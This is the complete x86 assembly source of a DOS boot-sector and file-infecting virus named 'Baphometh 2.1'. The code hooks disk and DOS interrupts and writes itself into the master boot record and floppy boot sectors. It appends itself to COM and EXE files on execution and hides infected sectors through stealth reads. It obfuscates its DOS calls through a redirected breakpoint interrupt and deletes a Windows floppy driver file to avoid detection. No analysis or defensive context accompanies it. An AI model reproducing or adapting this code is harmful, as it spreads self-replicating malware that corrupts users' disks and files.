   ; Baphometh 2.1 01/31/99

   .286

   Baphometh segment
     assume cs:Baphometh

    ORG 0

    COM equ 0
    EXE equ 1


   StartOfBaphometh:
     jmp OverFloppyStuff

    db 3Ch dup(?)

    OverFloppyStuff:

     mov cx,EndOfFirstPart - StartOfBaphometh      ; used below

     xor ax,ax
     cli
     mov sp,7C00h
     mov ss,ax
     sti

     xor di,di      ; used below

     mov si,6150h
     mov ds,ax
     xor si,6543h  ; SI = 413h
     sub word ptr ds:[si],4
     mov ax,ds:[si]
     shl ax,6

     mov si,7C00h      ; used below

     mov es,ax

     push cs
     pop ds

     rep movsb     ; look above

     push es
     push offset TopOfMem
     retf

     Marker dw 'DT'

    GetBaphomethSector:
     mov cx,12
     mov dh,1
     cmp dl,80h
     jb ItsAFloppy
     mov cx,3
     mov dh,0
    ItsAFloppy:
     ret

    TopOfMem:
     xor ax,ax
     mov ds,ax

     mov byte ptr cs:[DosFinishedLoading],0

     lea ax,EvilInt13h
     mov bx,cs
     cli
     xchg ds:[13h*4],ax
     xchg ds:[13h*4+2],bx
     mov word ptr cs:[GoodInt13h],ax
     mov word ptr cs:[GoodInt13h+2],bx
     sti

     mov ax,7575h      ; 0202
     lea bx,EndOfFirstPart
     call GetBaphomethSector
     call OldInt13h

     push cs
     pop ds

     int 19h

    DosFinishedLoading db 0

    EvilInt13h:
     pushf
     cmp ah,0F2h
     jne NoInstallCheck
     mov bx,4321h
     popf
     iret
    NoInstallCheck:

     pusha
     push ds

     cmp byte ptr cs:[DosFinishedLoading],1
     je DontHookInt21hYet

     xor ax,ax
     mov ds,ax

     mov ax,ds:[21h*4+2]

     cmp ax,0
     je DontHookInt21hYet

     cmp ax,800h
     ja DontHookInt21hYet

     cmp ax,ds:[20h*4+2]
     jne DontHookInt21hYet

     mov byte ptr cs:[DosFinishedLoading],1

     lea ax,EvilInt21h
     mov bx,cs
     cli
     xchg ax,ds:[21h*4]
     xchg bx,ds:[21h*4+2]
     mov word ptr cs:[GoodInt21h],ax
     mov word ptr cs:[GoodInt21h+2],bx
     sti

    DontHookInt21hYet:
     pop ds
     popa

     cmp ah,2
     jne NotForUs
     cmp cx,1
     jne NotForUs
     cmp dh,0
     jne NotForUs

     xor ax,7777h
     popf
     call OldInt13h
     jnc EatIt

     retf 2

    NotForUs:
    popf
    db 0EAh
    GoodInt13h dd ?

    OldInt13h:
     pushf
     xor ax,7777h
     popf
     pushf
     call dword ptr cs:[GoodInt13h]
     ret

    EatIt:
     pushf
     pusha
     push ds
     push es

     cmp es:[bx+Marker],'DT'
     jne InfectSector

     mov ax,7576h  ; 0201
     call GetStealthSector
     call OldInt13h

     jmp Done

    GetStealthSector:
     mov cx,2
     mov dh,0
     cmp dl,80h
     jae NoFloppy
     mov cx,14
     mov dh,1
    NoFloppy:
     ret

    InfectSector:
     lea di,[StartOfBaphometh+2]   ; used below

     mov ax,7476h  ; 0301
     call GetStealthSector

     mov si,bx
     add si,2                      ; used below

     call OldInt13h

     mov cx,3Ch    ; used below

     push es
     pop ds
     push cs
     pop es

     rep movsb     ; look above

     inc word ptr cs:[InfectionCounter]

     mov ax,7476h  ; 0301
     lea bx,StartOfBaphometh
     mov cx,1
     mov dh,0
     call OldInt13h

     mov ax,7475h  ; 0302
     lea bx,EndOfFirstPart
     call GetBaphomethSector
     call OldInt13h

    Done:
     pop es
     pop ds
     popa
     popf
     retf 2

    Header db 1Ch dup('H')
    FileSize dd ?
    GoodInt24h dd ?
    GoodInt13h2 dd ?
    InfectionCounter dw 0

    HsFlopDotPdr db 'c:\windows\system\iosubsys\hsflop.pdr',0
    Whatever db '*Bapho''s*Son*CAD'

    AsciiSize equ $ - HsFlopDotPdr

    ORG 510
     db 55h,0AAh

    EndOfFirstPart:

    EvilInt24h:
     iret

    EvilInt21h:
     pushf
     cmp ax,42CBh ; 0deadh
     jne NoInt21InstallCheck
     mov bx,0BCBCh
     popf
     iret
    NoInt21InstallCheck:
     xor ah,0D6h
     cmp ah,9Dh    ; 4Bh
     je InfectFile
     xor ah,0D6h
    RestoreInt21h:
     popf
    db 0eah
    GoodInt21h dd ?

    InfectFile:
     xor ah,0D6h
     pusha
     push ds es

     push ds
     xor ax,ax
     mov ds,ax

     lea ax,EvilInt24h
     mov bx,cs
     cli
       xchg ax,word ptr ds:[24h*4]
       xchg bx,word ptr ds:[24h*4+2]
       mov word ptr cs:[GoodInt24h],ax
       mov word ptr cs:[GoodInt24h+2],bx
     sti

     lea ax,EvilInt3h
     mov bx,cs
     cli
       xchg ax,word ptr ds:[3h*4]
       xchg bx,word ptr ds:[3h*4+2]
       mov word ptr cs:[GoodInt3h],ax
       mov word ptr cs:[GoodInt3h+2],bx
     sti
     pop ds

     mov ax,8800h  ; 43
     int 3h

     push dx ds cx

     mov ax,8801h  ; 43
     xor cx,cx
     int 3h
     jnc NoErrorsWritingToDisk
     jmp FileError

    NoErrorsWritingToDisk:
     mov ax,0F602h  ; 3d
     int 3h
     jnc Opened
     jmp FileError

    Opened:
     xchg ax,bx

     push cs cs
     pop ds es

     mov ax,9C00h  ; 57
     int 3h

     push cx dx

     mov ah,0F4h    ; 3f
     lea dx,Header
     mov cx,1Ch
     int 3h

     mov ax,'TD'
     xor ax,word ptr cs:[Header]

     cmp ax,0E09h ; ZM
     jne ExeCheck
     jmp InfectEXE
    ExeCheck:
     cmp ax,191Eh  ; MZ
     jne SysCheck
     jmp InfectEXE
    SysCheck:
     cmp word ptr cs:[Header],0ffffh
     je CloseFile

    InfectCOM:
     mov ax,8902h  ; 42
     xor cx,cx
     xor dx,dx
     int 3h

     cmp dx,0
     ja CloseFile

     push ax
     sub ax,(EndOfBaphometh - FileEntryPoint) + 3
     cmp ax,word ptr cs:[Header+1]
     pop ax
     jne ComReadyToBeInfected
     jmp CloseFile

    ComReadyToBeInfected:
     mov byte ptr cs:[WeAre],COM

     sub ax,3
     add ax,FileEntryPoint - StartOfBaphometh
     mov word ptr cs:[NewJmp+1],ax

     mov ax,8902h  ; 42
     mov cx,-1
     mov dx,-2
     int 3h

     mov ah,0f4h    ; 3f
     lea dx,ENUNS
     mov cx,2
     int 3h

     add word ptr cs:[ENUNS],EndOfBaphometh - StartOfBaphometh

     mov word ptr cs:[ENUNS-5],'NE'
     mov word ptr cs:[ENUNS-3],'NU'
     mov byte ptr cs:[ENUNS-1],'S'

     inc word ptr cs:[bp+InfectionCounter]

     mov ah,8Bh    ; 40h
     lea dx,StartOfBaphometh
     mov cx,EndOfBaphometh - StartOfBaphometh
     int 3h

     mov ax,8900h  ; 42
     xor cx,cx
     xor dx,dx
     int 3h

     mov ah,8Bh    ; 40
     lea dx,NewJmp
     mov cx,3
     int 3h

    CloseFile:
     mov ax,9C01h  ; 57
     pop dx cx
     int 3h

     mov ah,0F5h    ; 3e
     int 3h


    FileError:
     pop cx ds dx

     mov ax,8801h  ; 43
     int 3h

     xor ax,ax
     mov ds,ax

     mov ax,word ptr cs:[GoodInt24h]
     mov bx,word ptr cs:[GoodInt24h+2]
     cli
       mov word ptr ds:[24h*4],ax
       mov word ptr ds:[24h*4+2],bx
     sti

     mov ax,word ptr cs:[GoodInt3h]
     mov bx,word ptr cs:[GoodInt3h+2]
     cli
       mov word ptr ds:[3h*4],ax
       mov word ptr ds:[3h*4+2],bx
     sti

     pop es ds
     popa
     jmp RestoreInt21h

    FileEntryPoint:
     mov ah,30h
     int 21h
     cmp al,2
     jnb its_ok
     int 20h
    its_ok:

     mov cx,0ffffh
     FLoop1:
     jmp FLoop2
     mov ax,4C00h
     int 21h
     FLoop2:
     loop FLoop1

     mov ah,1
     int 16h

     push ds es

     call Delta
    Delta:
     pop bp
     sub bp,offset Delta

     call AsciiCrypt
     in al,40h
     mov byte ptr cs:[bp+AsciiXorValue],al
     call AsciiCrypt

     mov ax,42CBh ; 0deadh
     int 21h
     cmp bx,0BCBCh
     jne GoTSR
     jmp ManualMBRInfection

    GoTSR:
     lea si,[bp+StartOfBaphometh]  ; used further below, at rep movsb
     xor di,di
     mov cx,EndOfBaphometh - StartOfBaphometh

     mov ax,ds
     sub ax,2
   ; dec ax
     mov ds,ax

     sub word ptr ds:[13h],40h*4
     sub word ptr ds:[22h],40h*4

     xor bx,bx
     mov ds,bx

     or bx,413h

     sub word ptr ds:[bx],4
     mov ax,word ptr ds:[bx]
     shl ax,6

     mov es,ax

     push cs
     pop ds

     rep movsb     ; look above

     xor ax,ax
     mov ds,ax

     lea ax,EvilInt21h
     mov bx,es
     cli
     xchg ds:[21h*4],ax
     xchg ds:[21h*4+2],bx
     mov word ptr es:[GoodInt21h],ax
     mov word ptr es:[GoodInt21h+2],bx
     sti

    ManualMBRInfection:
     xor ax,ax
     mov ds,ax
     cli
     mov ax,word ptr ds:[13h*4]
     mov word ptr cs:[bp+GoodInt13h2],ax
     mov ax,word ptr ds:[13h*4+2]
     mov word ptr cs:[bp+GoodInt13h2+2],ax
     sti

     push cs cs
     pop es ds

      call AsciiCrypt

      mov ah,41h
      lea dx,[bp+HsflopDotPdr]
      int 21h

      call AsciiCrypt

      mov ax,0BEDFh   ; 0201
      mov dx,80h
      mov cx,1
      lea bx,[bp+EndOfBaphometh]
      call OldInt13h2

      cmp word ptr cs:[bx+offset Marker],'DT'
      jne MBRNotYetInfected
      jmp Restore

     MBRNotYetInfected:
      mov ax,0BFDFh   ; 0301
      inc cx
      call OldInt13h2

      mov ax,0BFDFh        ; 0301
      mov bx,bp
      dec cx
      call OldInt13h2

      mov ax,0BFDCh         ; 0302
      add bx,512
      mov cx,3
      call OldInt13h2

    Restore:
     cmp byte ptr cs:[bp+WeAre],EXE
     je RestoreEXE

     pop es ds

    RestoreCom:
     lea si,[bp+Header]
     mov di,100h
     movsw
     movsb

     push 100h
     ret

    NewJmp db 0e9h,0,0
    WeAre db EXE

    RestoreEXE:
     lea si,[bp+Original_IP]
     lea di,[bp+Old_IP]
     mov cx,4
     rep movsw

     pop es ds

     mov ax,es
     add ax,10h

     add word ptr cs:[bp+Old_CS],ax
     cli
     add ax,word ptr cs:[bp+Old_SS]
     mov ss,ax
     mov sp,word ptr cs:[bp+Old_SP]
     sti

    db 0eah
    Old_IP dw ?
    Old_CS dw ?
    Old_SS dw ?
    Old_SP dw ?
    Original_IP dw offset DummyFile
    Original_CS dw 0
    Original_SS dw 0
    Original_SP dw 0FFFEh

    InfectEXE:
     cmp word ptr cs:[Header+18h],40h
     jb NoNewEXE
     jmp CloseFile
    NoNewEXE:
     cmp word ptr cs:[Header+12h],'DT'
     jne EXENotYetInfected
     jmp CloseFile

    EXENotYetInfected:
     mov byte ptr cs:[WeAre],EXE
     mov word ptr cs:[Header+12h],'DT'
     mov ax,word ptr cs:[Header+0Eh]
     mov word ptr cs:[Original_SS],ax
     mov ax,word ptr cs:[Header+10h]
     mov word ptr cs:[Original_SP],ax
     mov ax,word ptr cs:[Header+14h]
     mov word ptr cs:[Original_IP],ax
     mov ax,word ptr cs:[Header+16h]
     mov word ptr cs:[Original_CS],ax

     mov ax,word ptr cs:[Header+4]

     cmp word ptr cs:[Header+2],0
     je NoRemainder2
     dec ax
    NoRemainder2:

     mov cx,512
     mul cx

     add ax,word ptr cs:[Header+2]
     adc dx,0

     mov word ptr cs:[FileSize],ax
     mov word ptr cs:[FIleSize+2],dx

     mov ax,8902h  ; 42
     xor cx,cx
     xor dx,dx
     int 3h

     cmp word ptr cs:[FileSize],ax
     je MightHaveNoOverlays
     jmp CloseFile
    MightHaveNoOverlays:
     cmp word ptr cs:[FileSize+2],dx
     je HasNoOverlays
     jmp CloseFile

    HasNoOverlays:
     push ax dx

     add ax,EndOfBaphometh - StartOfBaphometh
     adc dx,0

     mov cx,512
     div cx

     cmp dx,0
     je NoRemainder
     inc ax
    NoRemainder:

     mov word ptr cs:[Header+4],ax
     mov word ptr cs:[Header+2],dx

     pop dx ax

     mov cx,16
     div cx

     add dx,offset FileEntryPoint

     mov cx,word ptr cs:[Header+8]
     sub ax,cx

     mov word ptr cs:[Header+16h],ax
     mov word ptr cs:[Header+14h],dx
     inc ax
     mov word ptr cs:[Header+0eh],ax
     mov word ptr cs:[Header+10h],0fffeh

     lea di,[ENUNS-5]
     xor al,al
     mov cx,5
     rep stosb

     inc word ptr cs:[bp+InfectionCounter]

     mov ah,8Bh    ; 40
     lea dx,StartOfBaphometh
     mov cx,EndOfBaphometh - StartOfBaphometh
     int 3h

     mov ax,8900h  ; 42
     xor cx,cx
     xor dx,dx
     int 3h

     mov ah,8Bh    ; 40
     lea dx,Header
     mov cx,1Ch
     int 3h

     jmp CloseFile

    OldInt13h2:
     pushf
     xor ax,0BCDEh
     popf
     pushf
     call dword ptr cs:[bp+GoodInt13h2]
     ret

    AsciiCrypt:
     push ds es cs cs
     pop es ds
     lea si,[bp+HsFlopDotPdr]
     mov di,si
     mov cx,AsciiSize
    XorLoop:
     mov al,byte ptr ds:[si]
     inc si
     xor al,byte ptr cs:[bp+AsciiXorValue]
     mov byte ptr es:[di],al
     inc di
     dec cx
     jcxz XorLoopDone
     jmp XorLoop
    XorLoopDone:
     pop es ds
     ret

    AsciiXorValue db 0

    EvilInt3h:
     xor ah,0CBh
     jmp dword ptr cs:[GoodInt21h]
    GoodInt3h dd ?

    DummyFile:
     mov ax,4C00h
     int 21h

    ORG 1529
    db 'ENUNS'
    ENUNS dw ?

    EndOfBaphometh:

   Baphometh ends
   end FileEntryPoint
